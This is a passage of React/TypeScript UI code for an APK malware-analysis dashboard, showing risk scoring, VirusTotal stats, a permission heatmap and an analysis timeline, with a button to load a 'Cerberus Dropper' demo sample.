              <span className="material-symbols-outlined mr-xs text-[18px]">bug_report</span>
              Inject: Cerberus Dropper
            </button>
          </div>
        )}

        {/* Live log */}
        {(isAnalyzing || logs.length > 0) && (
          <div ref={logRef} className="bg-[#1d1a24] text-[#d3bbff] font-code-sm text-code-sm rounded p-md overflow-x-auto border border-[#38485d]" style={{ maxHeight: 90, padding: "10px 16px" }}>
            {logs.map((l: any, i: number) => (
              <div key={`log-${i}`} style={{ color: l.level === "error" ? "var(--accent-red)" : l.level === "warning" ? "var(--accent-yellow)" : l.level === "success" ? "var(--accent-green)" : "#1A7F4B" }}>
                <span style={{ opacity: 0.5, marginRight: 8 }}>[{l.pct}%]</span>{l.message}
              </div>
            ))}
            {isAnalyzing && <div style={{ color: "var(--accent-cyan)" }}>▌<span className="blink">_</span></div>}
          </div>
        )}
      </div>

      {/* Results grid */}
      {analysisResult && (
        <div style={{ display: "grid", gridTemplateColumns: "1.4fr 1fr", gridTemplateRows: "auto auto", gap: 20 }}>

          {/* ── Risk Score card ── */}
          <div className="bg-surface-container-lowest border border-outline-variant rounded p-lg flex flex-col transition-colors hover:border-primary" style={{ minHeight: 380 }}>
            <div className="flex justify-between items-center mb-4">
              <div>
                <h2 className="font-headline-sm text-headline-sm text-on-surface">Risk Assessment</h2>
                <p className="text-on-surface-variant font-code-sm" style={{ fontSize: "0.7rem" }}>Rule-based weighted scoring engine</p>
              </div>
              <button className="bg-primary text-on-primary font-label-mono text-label-mono px-lg py-sm rounded hover:bg-primary-container transition-colors" onClick={onDownloadPdf}>↓ PDF Report</button>
            </div>
            <div className="flex items-center gap-8 flex-1">
              {/* Arc + score */}
              <div style={{ position: "relative", width: 280, height: 280, flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
                <ScoreArc score={riskScore} tier={riskTier} />
                <div style={{ position: "absolute", textAlign: "center" }}>
                  <div className="text-on-surface-variant font-code-sm" style={{ fontSize: "0.68rem", marginBottom: 4 }}>RISK SCORE</div>
                  <div className="font-extrabold" style={{ fontSize: "2.5rem", fontFamily: "var(--font-mono)", color: verdictColor(riskTier), lineHeight: 1 }}>
                    <AnimatedCount value={riskScore} />
                  </div>
                  <div style={{ fontSize: "0.65rem", fontFamily: "var(--font-mono)", color: "var(--text-muted)", marginTop: 2 }}>/ 100</div>
                  <div style={{ marginTop: 8 }}>
                    <span className={verdictBadgeClass(riskTier)}>{riskTier}</span>
                  </div>
                  {scoreData && (
                    <div className="text-on-surface-variant font-code-sm" style={{ fontSize: "0.65rem", marginTop: 6 }}>Confidence: {scoreData.confidence}</div>
                  )}
                </div>
              </div>

              {/* Findings list */}
              <div className="flex-col gap-3 flex-1">
                {[
                  { label: "Critical", count: critCount, color: "var(--accent-red)",    sev: "CRITICAL" },
                  { label: "High",     count: highCount, color: "var(--accent-orange)", sev: "HIGH" },
                  { label: "Medium",   count: medCount,  color: "var(--accent-yellow)", sev: "MEDIUM" },
                  { label: "Low",      count: lowCount,  color: "var(--accent-green)",  sev: "LOW" },
                ].map(({ label, count, color, sev }) => (
                  <div key={sev}
                    className="hover-row p-2 rounded-md cursor-pointer"
                    onClick={() => setExpandedSeverity(expandedSeverity === sev ? null : sev)}
                    style={{ border: "1px solid", borderColor: expandedSeverity === sev ? `${color}40` : "transparent", borderRadius: 8 }}
                  >
                    <div className="flex items-center gap-3">
                      <div style={{ width: 7, height: 7, borderRadius: "50%", background: color, boxShadow: `0 0 8px ${color}`, flexShrink: 0 }} />
                      <div className="flex-1">
                        <div className="flex justify-between items-center">
                          <span style={{ fontSize: "0.82rem", fontWeight: 600, color: "var(--text-primary)" }}>{label} Issues</span>
                          <span style={{ fontSize: "0.82rem", fontWeight: 800, color, fontFamily: "var(--font-mono)" }}>{count}</span>
                        </div>
                        <div style={{ height: 3, background: "rgba(15,23,42,0.06)", borderRadius: 999, marginTop: 4 }}>
                          <div style={{ width: totalIssues ? `${(count / totalIssues) * 100}%` : "0%", height: "100%", background: color, borderRadius: 999, transition: "width 1s ease" }} />
                        </div>
                      </div>
                      <span style={{ fontSize: "0.65rem", color: "var(--text-muted)", transform: expandedSeverity === sev ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}>▾</span>
                    </div>
                    {expandedSeverity === sev && count > 0 && (
                      <div className="flex-col gap-2 animate-fadein" style={{ marginTop: 8, paddingLeft: 16 }}>
                        {analysisResult.analysis.findings.filter((f: any) => f.severity === sev).map((f: any, idx: number) => (
                          <div key={f.id || `f-${sev}-${idx}`} style={{ padding: "8px 12px", borderRadius: 6, background: `${color}0D`, border: `1px solid ${color}30` }}>
                            <div style={{ fontSize: "0.75rem", fontWeight: 700, color }}>{f.title}</div>
                            <div style={{ fontSize: "0.7rem", color: "var(--text-muted)", marginTop: 2 }}>{f.description}</div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* ── Right column ── */}
          <div className="flex-col gap-4">
            {/* VT Quick Result */}
            {analysisResult.analysis.virusTotal && (
              <div className={`bg-surface-container-lowest border border-outline-variant rounded p-lg flex flex-col transition-colors hover:border-primary animate-fadein`} style={{ borderColor: analysisResult.analysis.virusTotal.stats?.malicious ? "rgba(224,65,61,0.3)" : "rgba(31,165,106,0.3)" }}>
                <div className="flex justify-between items-center mb-3">
                  <h3 className="font-headline-sm text-headline-sm text-on-surface">🛡 VirusTotal</h3>
                  <span className="bg-surface-container text-on-surface-variant border border-outline-variant rounded-sm px-sm py-[2px] font-label-mono text-[11px]" style={{ fontSize: "0.62rem" }}>Community Intel</span>
                </div>
                {analysisResult.analysis.virusTotal.found ? (
                  <div className="flex items-center gap-4">
                    <div style={{ textAlign: "center", flexShrink: 0 }}>
                      <div className="font-extrabold" style={{ fontSize: "2rem", fontFamily: "var(--font-mono)", color: analysisResult.analysis.virusTotal.stats?.malicious ? "var(--accent-red)" : "var(--accent-green)", lineHeight: 1 }}>
                        <AnimatedCount value={analysisResult.analysis.virusTotal.stats?.malicious ?? 0} />
                      </div>
                      <div style={{ fontSize: "0.62rem", color: "var(--text-muted)", marginTop: 2 }}>MALICIOUS</div>
                    </div>
                    <div className="flex-1 flex-col gap-2">
                      {[
                        { label: "Malicious",  val: analysisResult.analysis.virusTotal.stats?.malicious ?? 0,  color: "var(--accent-red)" },
                        { label: "Suspicious", val: analysisResult.analysis.virusTotal.stats?.suspicious ?? 0, color: "var(--accent-yellow)" },
                        { label: "Harmless",   val: analysisResult.analysis.virusTotal.stats?.harmless ?? 0,   color: "var(--accent-green)" },
                      ].map(s => {
                        const total = (analysisResult.analysis.virusTotal.stats?.malicious ?? 0) + (analysisResult.analysis.virusTotal.stats?.suspicious ?? 0) + (analysisResult.analysis.virusTotal.stats?.harmless ?? 0) + (analysisResult.analysis.virusTotal.stats?.undetected ?? 0);
                        return (
                          <div key={s.label} className="flex items-center gap-2">
                            <span style={{ fontSize: "0.65rem", color: "var(--text-muted)", width: 62, flexShrink: 0 }}>{s.label}</span>
                            <div style={{ flex: 1, height: 4, background: "rgba(15,23,42,0.06)", borderRadius: 999, overflow: "hidden" }}>
                              <div style={{ width: total ? `${(s.val / total) * 100}%` : "0%", height: "100%", background: s.color, borderRadius: 999, transition: "width 1s ease" }} />
                            </div>
                            <span style={{ fontSize: "0.65rem", fontFamily: "var(--font-mono)", fontWeight: 700, color: s.color, width: 22, textAlign: "right" }}>{s.val}</span>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                ) : (
                  <div className="text-muted text-sm">Not found in VT database. Submitted for scan.</div>
                )}
              </div>
            )}

            {/* Permissions Heatmap */}
            <div className="bg-surface-container-lowest border border-outline-variant rounded p-lg flex flex-col transition-colors hover:border-primary">
              <div className="flex justify-between items-center mb-3">
                <h3 className="font-headline-sm text-headline-sm text-on-surface">Permission Matrix</h3>
                <span className="text-on-surface-variant font-code-sm" style={{ fontSize: "0.68rem" }}>{analysisResult.manifest.permissions.length} declared</span>
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(10, 1fr)", gap: 3 }}>
                {Array.from({ length: Math.max(30, analysisResult.manifest.permissions.length + 5) }).map((_, i) => {
                  const perm = analysisResult.analysis.permissions[i];
                  const color = !perm ? "rgba(15,23,42,0.06)" :
                    perm.severity === "CRITICAL" ? "var(--accent-red)" :
                    perm.severity === "HIGH"     ? "var(--accent-orange)" :
                    perm.severity === "MEDIUM"   ? "var(--accent-yellow)" : "var(--accent-green)";
                  return (
                    <div key={`perm-cell-${i}`} title={perm?.name} style={{
                      height: 14, borderRadius: 3,
                      background: color,
                      opacity: perm ? 0.9 : 0.1,
                      transition: `opacity 0.3s ease ${i * 0.02}s`,
                      cursor: perm ? "pointer" : undefined,
                    }} />
                  );
                })}
              </div>
              <div className="flex gap-4 mt-3">
                {[["CRIT", "var(--accent-red)"], ["HIGH", "var(--accent-orange)"], ["MED", "var(--accent-yellow)"], ["LOW", "var(--accent-green)"]].map(([l, c]) => (
                  <div key={l} className="flex items-center gap-1">
                    <div style={{ width: 8, height: 8, borderRadius: 2, background: c }} />
                    <span style={{ fontSize: "0.62rem", color: "var(--text-muted)" }}>{l}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* ── DNA Fingerprint + Score Breakdown ── */}
          <div className="bg-surface-container-lowest border border-outline-variant rounded p-lg flex flex-col transition-colors hover:border-primary" style={{ gridColumn: "1 / 2" }}>
            <div className="flex justify-between items-center mb-4">
              <div>
                <h2 className="font-headline-sm text-headline-sm text-on-surface">DNA Fingerprint</h2>
                <p className="text-on-surface-variant font-code-sm" style={{ fontSize: "0.7rem" }}>Composite threat signal visualization</p>
              </div>
            </div>
            <div className="flex gap-6">
              <div className="flex-col items-center" style={{ flexShrink: 0 }}>
                <DnaFingerprint
                  verdict={riskTier as any}
                  score={riskScore}
                  permissionCount={analysisResult.manifest.permissions.length}
                  criticalPermissions={analysisResult.analysis.permissions.filter((p: any) => p.severity === "CRITICAL").length}
                  suspiciousPermissions={analysisResult.analysis.permissions.filter((p: any) => p.severity === "HIGH" || p.severity === "MEDIUM").length}
                  highRiskApis={analysisResult.analysis.sdks.length}
                  urlCount={analysisResult.analysis.urls.length}
                  ipCount={analysisResult.analysis.ips.length}
                  classCount={analysisResult.classNames.length}
                  isDebuggable={analysisResult.manifest.application?.debuggable}
                  debugKey={analysisResult.signature.debugKey}
                  size={240}
                />
                <span className="text-on-surface-variant font-code-sm" style={{ fontSize: "0.65rem", marginTop: 6 }}>Concentric threat rings</span>
              </div>
              <div className="flex-1" style={{ minWidth: 0, maxHeight: 340, overflowY: "auto" }}>
                {scoreData && <ScoreBreakdown result={scoreData} />}
              </div>
            </div>
          </div>

          {/* ── Analysis Timeline ── */}
          <div className="bg-surface-container-lowest border border-outline-variant rounded p-lg flex flex-col transition-colors hover:border-primary" style={{ gridColumn: "2 / 3" }}>
            <div className="flex justify-between items-center mb-4">
              <div>
                <h2 className="font-headline-sm text-headline-sm text-on-surface">Analysis Pipeline</h2>
                <p className="text-on-surface-variant font-code-sm" style={{ fontSize: "0.7rem" }}>Engine stage-by-stage timeline</p>
              </div>
            </div>
            <AnalysisTimeline
              stages={buildStagesFromProfile(
                analysisResult.manifest.packageName || "unknown",
                analysisResult.manifest.permissions.length,
                analysisResult.classNames.length,
                analysisResult.analysis.urls.length,
                analysisResult.signature.status === "valid" ? "TRUSTED" : "UNTRUSTED",
                riskTier,
              )}
            />
          </div>
        </div>
      )}
    </div>
  );
}

function EmptyState({ icon, title, subtitle }: { icon: string; title: string; subtitle: string }) {
  return (
    <div className="tpl-card flex-col items-center justify-center gap-4" style={{ minHeight: 320, opacity: 0.55 }}>
      <div style={{ fontSize: "3rem" }}>{icon}</div>
      <div className="font-bold" style={{ fontSize: "1rem" }}>{title}</div>
      <div className="text-muted text-sm">{subtitle}</div>
    </div>
  );
}
